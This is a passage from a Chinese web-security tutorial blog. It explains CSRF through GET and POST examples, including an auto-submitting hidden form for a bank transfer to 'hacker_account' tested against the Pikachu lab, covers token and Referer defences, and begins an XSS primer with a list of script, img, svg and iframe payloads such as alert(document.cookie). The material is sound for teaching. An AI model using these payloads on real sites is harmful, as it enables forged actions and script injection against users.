class="headerlink" title="3. CSRF的分类"></a>3. CSRF的分类</h2><h3 id="3-1-GET类型的CSRF"><a href="#3-1-GET类型的CSRF" class="headerlink" title="3.1 GET类型的CSRF"></a>3.1 GET类型的CSRF</h3><ul><li><p>仅仅需要一个HTTP请求就能构造一次简单的CSRF。</p></li><li><p><strong>描述：</strong>敏感操作（如修改、删除）被设计为通过GET请求完成。</p></li><li><p><strong>攻击方式：</strong>攻击者只需要构造一个URL，当用户（在已经登陆目标网站的情况下）访问这个URL时，攻击就会发生。通常通过<code>img</code>、<code>script</code>、<code>iframe</code>等标签的<code>src</code>属性自动发起请求。</p></li><li><p><strong>攻击示例</strong></p><ol><li><p>假设一个博客网站删除文章的链接是：<code>https://blog.com/delete-article?articleId=123</code></p><ul><li>则攻击者可以在自己的恶意页面中嵌入：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://blog.com/delete-article?articleId=123&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><ul><li>这样当用户访问该页面时，标签自动执行就导致文章ID为123的文章被删除。</li><li>也可以诱导用户点击类似的连接：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://blog.com/delete-article?articleId=123&quot;</span>&gt;</span>点击我领取大奖！<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>这里我们通过pikachu靶场的相关板块来做一个例子：</p><ul><li>在登陆用户之后我们可以修改和提交用户信息，在这里BP抓包一下。</li></ul><p><img src="/../images/CSRF/2.png" alt="2"></p><ul><li><p>可以看到是GET提交的数据包<code>/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=1111&amp;add=USA&amp;email=888888%40163.com&amp;submit=submit</code>也就是说我们可以直接通过伪造提交的数据包从而修改用户信息。</p></li><li><p>既然如此我们可以构造这样的Payload：</p><p><code>/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=123113321&amp;add=USA&amp;email=888888%40163.com&amp;submit=submit（注意这里我们修改了</code>phonenum&#96;的内容）</p></li><li><p>构造好Payload之后我们模拟用户点击的过程，可以拟写一个简单的html。</p></li></ul><p><img src="/../images/CSRF/3.png" alt="3"></p><ul><li>之后模拟用户点击过程。</li></ul><p><img src="/../images/CSRF/4.png" alt="4"></p><ul><li>这时用户的资料信息已经被我们修改了，我们可以返回pikachu靶场刷新之后查看结果。</li></ul><p><img src="/../images/CSRF/5.png" alt="5"></p></li></ol></li><li><p>综上所述GET类型的CSRF的特点是：<strong>用户无需进行如点击按钮等额外的其他操作，只需要访问恶意页面或者点击恶意连接即可完成。</strong></p></li></ul><h3 id="3-2-POST类型的CSRF"><a href="#3-2-POST类型的CSRF" class="headerlink" title="3.2 POST类型的CSRF"></a>3.2 POST类型的CSRF</h3><ul><li><p>在CSRF当中POST请求相较于GET请求是更常见的存在，因为现代Web开发规范要求修改数据的操作必须使用POST请求。</p></li><li><p><strong>描述：</strong>敏感操作通过POST请求完成，需要提交表单数据。</p></li><li><p><strong>攻击方式：</strong>攻击者需要构造一个隐藏的HTML表单，并通过JavaScript自动提交。这需要用户访问一个恶意页面，但用户无需点击表单提交按钮。</p></li><li><p><strong>攻击示例</strong></p><ol><li><p>这里我们构造一个简单的示例代码。进攻场景为用户登录了某家银行，之后访问了此恶意页面。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 页面加载后自动提交表单 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&#x27;csrfForm&#x27;</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;csrfForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;https://bank.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;toAccount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker_account&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>首先来看JS部分：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>document</code>：代表整个HTML文档的对象。</li><li><code>.addEventListener()</code>：添加事件监听器的方法。</li><li><code>&#39;DOMContentLoaded&#39;</code>：事件类型，表示HTML文档已完全加载和解析完成。</li><li><code>function() &#123;</code>：定义匿名函数（回调函数），事件触发时执行。</li><li><strong>整体作用就是为文档添加一个事件监听，当DOM加载完成之后执行指定函数。</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&#x27;csrfForm&#x27;</span>].<span class="title function_">submit</span>();</span><br></pre></td></tr></table></figure><ul><li><code>document.forms</code>：文档中所有表单的集合。</li><li><code>[&#39;csrfForm&#39;]</code>：通过name或id为<code>&quot;csrfForm&quot;</code>获取特定表单。</li><li><code>.submit()</code>：调用表单的提交方法。</li><li><strong>整体作用就是获取id为<code>&quot;csrfForm&quot;</code>的表单并自定提交。</strong></li></ul></li><li><p>之后看表单内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;csrfForm&quot;</span> <span class="attr">action</span>=<span class="string">&quot;https://bank.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>id=&quot;csrfForm&quot;</code>：表单的唯一标识符，JavaScript通过此id找到表单。</li><li><code>action=&quot;https://bank.com/transfer&quot;</code>：表单提交的目标URL。</li><li><code>method=&quot;POST&quot;</code>：使用POST方法提交（数据在请求体中，不在URL中显示）。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;toAccount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker_account&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>type=&quot;hidden&quot;</code>：隐藏类型的输入字段，用户看不到。</li><li><code>name=&quot;toAccount&quot;</code>：参数名称，服务器通过此名称获取值。</li><li><code>value=&quot;hacker_account&quot;</code>：参数值，攻击者的账户。</li><li><strong>整体作用就是创建一个隐藏字段，包含攻击者的账户信息。</strong></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>type=&quot;hidden&quot;</code>：同上，隐藏字段。</li><li><code>name=&quot;amount&quot;</code>：参数名，表示金额。</li><li><code>value=&quot;10000&quot;</code>：参数值，转账金额10000。</li><li>整体作用就是创建第二个隐藏字段，包含转账金额。</li></ul></li></ul></li><li><p>我们还是同pikachu靶场来做一个简单的示例。</p><ul><li>首先我们构造一段这样的代码（具体的含义在示例1中已经详细的解释了）。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=a, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&#x27;user&#x27;</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://你的靶场本机IP/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;boy&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;555555&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;LOL&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;abc@fox.com&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>之后我们登录pikachu中的用户。</li></ul><p><img src="/../images/CSRF/6.png" alt="6"></p><ul><li><p>之后再访问我们创建好的恶意网站，再返回pikachu靶场刷新一下可以发现用户信息已经被改变了。</p><p><img src="/../images/CSRF/7.png" alt="7"></p></li></ul></li></ol></li></ul><h2 id="4-CSRF漏洞挖掘"><a href="#4-CSRF漏洞挖掘" class="headerlink" title="4. CSRF漏洞挖掘"></a>4. CSRF漏洞挖掘</h2><p><strong>Referer字段</strong></p><ul><li>关于CSRF漏洞有一个很重要的字段——“Referer”，它可以用来判断是否存在CSRF漏洞。</li><li>Referer是HTTP请求头的一个字段，用来表示当前请求来自哪个页面&#x2F;URL，它是由浏览器自动添加的通常不可以被JS直接修改。</li><li>Referer的主要作用有分析流量来源、防止图片或资源被外部网站直接引用等，但是根据上述的作用可以发现，他是用来防御CSRF漏洞的一个重要手段。</li><li>通过上面的论述我们就可以发现，判断是否存在CSRF的最简单的方式就是抓取一个数据包，然后观察是否出现了Referer字段，如果没有那说么可能存在CSRF漏洞。</li><li>如果抓取的数据包中包含Referer字段，我们可以尝试去掉Referer字段之后重新提交，如果数据包仍然有效，CSRF也很有可能存在。</li></ul><h2 id="5-CSRF漏洞防御"><a href="#5-CSRF漏洞防御" class="headerlink" title="5. CSRF漏洞防御"></a>5. CSRF漏洞防御</h2><ul><li>防御CSRF漏洞的核心思想就是<strong>增加一个攻击者无法预测、无法伪造的额外验证信息。</strong>这个信息不能通过浏览器自动发送的机制来传递（比如说Cookie）。</li></ul><h3 id="5-1-使用CSRF-Tokens"><a href="#5-1-使用CSRF-Tokens" class="headerlink" title="5.1 使用CSRF Tokens"></a>5.1 使用CSRF Tokens</h3><ul><li>这是最常用最有效的CSRF漏洞防御方法，也是业界标准的防御方案。</li><li><strong>原理：</strong><ol><li>服务器会在用户会话中生成一个随机的、不可预测的令牌，也就是Token。</li><li>在渲染表单页面时，将这个Token作为一个隐藏的字段插入到表单当中去。</li><li>当用户提交表单请求时，这个Token会随机请求一起发送到服务器。</li><li>服务器收到请求之后，对比请求中的Token和会话中储存的Token是否一致。</li></ol></li><li>攻击者构造的恶意请求无法知道这个Token的值（因为受到了同源策略的保护），因此他发出的请求中无法包含正确的Token，所以服务器会拒绝执行。</li></ul><h3 id="5-2-验证-Referer和-OriginHeader"><a href="#5-2-验证-Referer和-OriginHeader" class="headerlink" title="5.2 验证 Referer和 OriginHeader"></a>5.2 验证 <code>Referer</code>和 <code>Origin</code>Header</h3><ul><li><strong>原理：</strong>检查HTTP请求头中的Referer（来源页面）或者Origin（请求来源）字段，确保请求来自同一个域下的合法页面。</li><li><strong>优点</strong>：实现简单。</li><li><strong>缺点</strong>：<ul><li>某些浏览器出于隐私考虑，可能不会发送 <code>Referer</code>。</li><li>用户可以配置浏览器禁用 <code>Referer</code>。</li><li>可能存在被绕过的方法（如某些旧版本浏览器的漏洞）。</li></ul></li><li>通常作为<strong>辅助防御</strong>手段，不应作为唯一手段。</li></ul><h2 id="6-CSRF-与-XSS-的区别"><a href="#6-CSRF-与-XSS-的区别" class="headerlink" title="6. CSRF 与 XSS 的区别"></a>6. CSRF 与 XSS 的区别</h2><table><thead><tr><th align="center">特性</th><th align="center"><strong>CSRF（跨站请求伪造）</strong></th><th align="center"><strong>XSS（跨站脚本攻击）</strong></th></tr></thead><tbody><tr><td align="center"><strong>攻击目标</strong></td><td align="center"><strong>利用</strong>用户的登录状态，以用户的身份执行操作。</td><td align="center"><strong>窃取</strong>用户的登录状态（Cookie）或其他敏感数据。</td></tr><tr><td align="center"><strong>信任关系</strong></td><td align="center">利用网站<strong>对用户浏览器</strong>的信任（“这个请求带着正确的Cookie，所以是用户本人”）。</td><td align="center">利用用户<strong>对网站内容</strong>的信任（“这个页面是合法的，所以会执行里面的脚本”）。</td></tr><tr><td align="center"><strong>攻击方式</strong></td><td align="center">诱使用户访问恶意第三方网站，由该网站向目标网站发出请求。</td><td align="center">将恶意脚本注入到目标网站本身，当用户访问目标网站时执行。</td></tr><tr><td align="center"><strong>所需条件</strong></td><td align="center">用户必须已登录目标网站。</td><td align="center">目标网站存在可被注入恶意脚本的漏洞。</td></tr></tbody></table><p><strong>简单说：XSS 是让用户在目标网站上执行攻击者的代码；CSRF 是让用户在攻击者的网站上向目标网站发出请求。</strong></p>]]></content>
      
      
      <categories>
          
          <category> TOP TEN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS基础</title>
      <link href="/2025/11/26/XSS%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/11/26/XSS%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS（跨站脚本攻击）基础"><a href="#XSS（跨站脚本攻击）基础" class="headerlink" title="XSS（跨站脚本攻击）基础"></a>XSS（跨站脚本攻击）基础</h1><h2 id="1-XSS的原理"><a href="#1-XSS的原理" class="headerlink" title="1. XSS的原理"></a>1. XSS的原理</h2><ul><li>通过攻击者向Web页面里插入恶意的Script代码，导致当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的，XSS是针对<strong>用户层面</strong>的攻击。</li></ul><h2 id="2-XSS的分类"><a href="#2-XSS的分类" class="headerlink" title="2. XSS的分类"></a>2. XSS的分类</h2><ul><li>XSS分为存储型、反射型、DOM型三种。</li></ul><h3 id="2-1-存储型XSS"><a href="#2-1-存储型XSS" class="headerlink" title="2.1 存储型XSS"></a>2.1 存储型XSS</h3><ul><li>存储型XSS又叫持久型XSS，它是通过<strong>攻击者将恶意脚本存储到服务器中</strong>，之后的每一位用户（受害者），浏览到包含该内容的页面时，存储在数据库中的恶意代码将被数据库读取并返回到浏览器上执行。</li><li>如下图所示这里我们通过DVWA靶场简单难度（对我们用户输入没有任何的过滤）进行简单的测试。</li></ul><p><img src="/../images/XSS/1.png" alt="1"></p><ul><li>这里可以看到，这个模块模拟的是一个留言板的功能，那对应到存储型XSS，因为一个网站所实现的留言或评论功能中，用户的留言是存储在数据库中的，在我们发布留言之后，网页就会出现弹窗，又因为留言是存储在数据库中的，所以当我们每次访问这个页面，弹窗也都会出现。</li></ul><p><img src="/../images/XSS/2.png" alt="2"></p><h3 id="2-2-反射型XSS"><a href="#2-2-反射型XSS" class="headerlink" title="2.2 反射型XSS"></a>2.2 反射型XSS</h3><ul><li>反射型XSS又叫做非持久型XSS，它是通过攻击者构造恶意代码的URL，通过诱骗用户点击该URL，从而在用户的浏览器中执行服务器返回页面中包含的恶意代码。</li><li>如下图所示，查看源码。</li></ul><p><img src="/../images/XSS/3.png" alt="3"></p><ul><li>这串代码 对攻击者的输入没有过滤导致攻击者可以构造恶意的URL，当用户访问后，代码中的echo将恶意的代码返回到用户的浏览器上。所以我么可以构造。</li></ul><p><img src="/../images/XSS/4.png" alt="4"></p><ul><li>弹窗也随之出现。</li></ul><p><img src="/../images/XSS/5.png" alt="5"></p><h3 id="2-3-DOM型XSS"><a href="#2-3-DOM型XSS" class="headerlink" title="2.3 DOM型XSS"></a>2.3 DOM型XSS</h3><ul><li>DOM型XSS不经过后端，是通过URL传入参数去控制触发的，它的操作其实与反射型大同小异。</li><li>如图，我们在 URL 中传入参数的值，然后客户端页面通过 js 脚本利用 DOM 的方法获得 URL 中参数的值，再通过 DOM 方法赋值给选择列表，该过程没有经过后端，完全是在前端完成的。所以，我们就可以在我们输入的参数上做手脚了。</li></ul><p><img src="/../images/XSS/6.png" alt="6"></p><h3 id="2-4-详细对比"><a href="#2-4-详细对比" class="headerlink" title="2.4 详细对比"></a>2.4 详细对比</h3><table><thead><tr><th align="left">特性</th><th align="center">反射型 XSS</th><th align="center">存储型 XSS</th><th align="center">DOM型 XSS</th></tr></thead><tbody><tr><td align="left"><strong>恶意代码存储位置</strong></td><td align="center"><strong>URL参数</strong>、POST数据中，<strong>不存储在服务器</strong></td><td align="center"><strong>服务器数据库</strong>（如评论、帖子、用户名）</td><td align="center"><strong>不存储在服务器</strong>，可能存在于URL片段（<code>#</code>后面）或客户端本地</td></tr><tr><td align="left"><strong>触发过程</strong></td><td align="center">1. 攻击者构造含恶意代码的URL<br />2. 诱骗用户点击该URL<br />3. 服务器返回的页面中包含该恶意代码<br />4. 用户浏览器执行</td><td align="center">1. 攻击者将恶意代码提交到服务器并保存<br />2.用户正常浏览包含该内容的页面（如评论页） <br />3. 服务器从数据库读取恶意代码并返回<br />4. 用户浏览器执行</td><td align="center">1. 攻击者构造一个特殊的URL（可能含恶意数据） <br />2. 诱骗用户点击<br />3. 用户浏览器接收到<strong>安全的页面</strong>（来自服务器）<br />4. 页面上的<strong>前端JS不安全地操作了DOM</strong>，将URL中的恶意数据作为代码执行</td></tr><tr><td align="left"><strong>危害范围</strong></td><td align="center">较低，需要诱导用户点击特定链接</td><td align="center"><strong>非常高</strong>，所有访问被感染页面的用户都会中招</td><td align="center">中等，需要诱导用户点击特定链接</td></tr><tr><td align="left"><strong>持久性</strong></td><td align="center">一次性，链接关闭即失效</td><td align="center"><strong>持久</strong>，只要恶意数据还在服务器上，就一直有风险</td><td align="center">一次性，通常链接关闭即失效</td></tr><tr><td align="left"><strong>与服务器的交互</strong></td><td align="center"><strong>有交互</strong>。恶意代码经服务器“反射”回来</td><td align="center"><strong>有交互</strong>。恶意代码存储在服务器，并由服务器下发</td><td align="center"><strong>可能无交互</strong>。攻击流程完全不经过服务器处理（恶意负载在URL片段<code>#</code>中时，服务器收不到该部分）</td></tr><tr><td align="left"><strong>关键区别点</strong></td><td align="center">恶意代码由服务器<strong>直接返回</strong>在响应体中</td><td align="center">恶意代码<strong>存储在服务器数据库</strong>中</td><td align="center">恶意代码的执行是<strong>前端JS处理不当</strong>的结果，服务器响应可能是完全正常的</td></tr></tbody></table><h2 id="3-XSS的攻击Payload"><a href="#3-XSS的攻击Payload" class="headerlink" title="3. XSS的攻击Payload"></a>3. XSS的攻击Payload</h2><ul><li>所有标签的<code>&gt;</code>都可以用<code>//</code>代替，例如<code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script//</code>。</li></ul><h3 id="3-1-利用常见HTML标签的事件处理器"><a href="#3-1-利用常见HTML标签的事件处理器" class="headerlink" title="3.1 利用常见HTML标签的事件处理器"></a>3.1 利用常见HTML标签的事件处理器</h3><ul><li>这是最主流的一类。许多HTML标签支持事件属性（如 <code>onclick</code>, <code>onerror</code>, <code>onload</code>, <code>onmouseover</code>），当事件触发时即可执行JS。</li></ul><h4 id="3-1-1-标签"><a href="#3-1-1-标签" class="headerlink" title="3.1.1 &lt;script&gt;标签"></a>3.1.1 <code>&lt;script&gt;</code>标签</h4><ul><li><p>他是XSS最直接的Payload，可以引入外部的JS代码也可以将JS代码插入到它中间。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>弹出<code>XSS</code>。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/XSS/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>弹出<code>XSS</code>。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>弹出<code>1</code>，数字可以不需要引号。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>弹出cookie值。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>引入外部的XSS，代指脚本地址。</li></ul></li></ul><h4 id="3-1-2-标签"><a href="#3-1-2-标签" class="headerlink" title="3.1.2 &lt;img&gt;标签"></a>3.1.2 <code>&lt;img&gt;</code>标签</h4><ul><li><p><strong>Payload：</strong><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(&quot;XSS&quot;)&quot;&gt;</code></p></li><li><p><strong>原理：</strong>将一个无效的URL<code>x</code>赋值给<code>src</code>属性。当图片加载失败时，<code>onerror</code>事件被触发，执行其中的JS。</p></li></ul><h4 id="3-1-3-标签"><a href="#3-1-3-标签" class="headerlink" title="3.1.3 &lt;svg&gt;标签"></a>3.1.3 <code>&lt;svg&gt;</code>标签</h4><ul><li><p><strong>Payload：</strong><code>&lt;svg onload=&quot;alert(&quot;XSS&quot;)&quot;</code></p></li><li><p><strong>原理：</strong>SVG本身是基于XML的，浏览器会将其内容作为文档对象模型的一部分来解析，<code>onload</code>事件在SVG加载完成后立即触发。</p></li></ul><h4 id="3-1-4-标签"><a href="#3-1-4-标签" class="headerlink" title="3.1.4  &lt;body&gt;标签"></a>3.1.4  <code>&lt;body&gt;</code>标签</h4><ul><li><p><strong>Payload：</strong><code>&lt;body onload=&quot;alert(&quot;XSS&quot;)&quot;</code></p></li><li><p><strong>原理：</strong>如果能控制<code>&lt;body&gt;</code>标签的属性（例如注入到模板中），可以利用其<code>onload</code>事件。</p></li></ul><h4 id="3-1-5-标签"><a href="#3-1-5-标签" class="headerlink" title="3.1.5 &lt;input&gt;标签"></a>3.1.5 <code>&lt;input&gt;</code>标签</h4><ul><li><p><strong>Payload：</strong><code>&lt;input type=&quot;text&quot; onfocus=&quot;alert(&quot;XSS&quot;)&quot; autofocus&gt;</code></p></li><li><p><strong>原理：</strong> 利用<code>onfocus</code>事件，当输入框获得焦点时触发。<code>autofocus</code>属性使其自动获得焦点。也可以结合 <code>onmouseover</code>等事件。</p></li></ul><h4 id="3-1-6-标签"><a href="#3-1-6-标签" class="headerlink" title="3.1.6 &lt;a&gt;标签"></a>3.1.6 <code>&lt;a&gt;</code>标签</h4><ul><li><p><strong>Payload：</strong><code>&lt;a onmouseover=&quot;alert(&quot;XSS&quot;)&quot;&gt;悬停在这里&lt;/a&gt;</code></p></li><li><p><strong>原理：</strong> 利用 <code>onmouseover</code>事件，当用户将鼠标悬停在链接上时触发。</p></li></ul><h4 id="3-1-7-标签"><a href="#3-1-7-标签" class="headerlink" title="3.1.7 &lt;details&gt;标签"></a>3.1.7 <code>&lt;details&gt;</code>标签</h4><ul><li><p><strong>Payload：</strong><code>&lt;details open ontoggle=&quot;alert(&quot;XSS&quot;)&quot;&gt;</code></p></li><li><p><strong>原理：</strong><code>ontoggle</code>事件在 <code>&lt;details&gt;</code>元素打开或关闭时触发。<code>open</code>属性确保它一开始就是打开的，从而立即触发事件。</p></li></ul><h3 id="3-2-利用不需要用户交互的标签和属性"><a href="#3-2-利用不需要用户交互的标签和属性" class="headerlink" title="3.2 利用不需要用户交互的标签和属性"></a>3.2 利用不需要用户交互的标签和属性</h3><ul><li>这类Payload在页面加载时自动触发，无需用户点击或悬停。</li></ul><h4 id="3-2-1-标签"><a href="#3-2-1-标签" class="headerlink" title="3.2.1 &lt;iframe&gt;标签"></a>3.2.1 <code>&lt;iframe&gt;</code>标签</h4><ul><li><strong>Payload：</strong><code>&lt;iframe src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</code></li></ul><ul><li><strong>原理：</strong> <code>iframe</code>的 <code>src</code>属性可以接受 <code>javascript:</code>伪协议。</li></ul><h4 id="3-2-2-或-标签"><a href="#3-2-2-或-标签" class="headerlink" title="3.2.2 &lt;embed&gt;或 &lt;object&gt;标签"></a>3.2.2 <code>&lt;embed&gt;</code>或 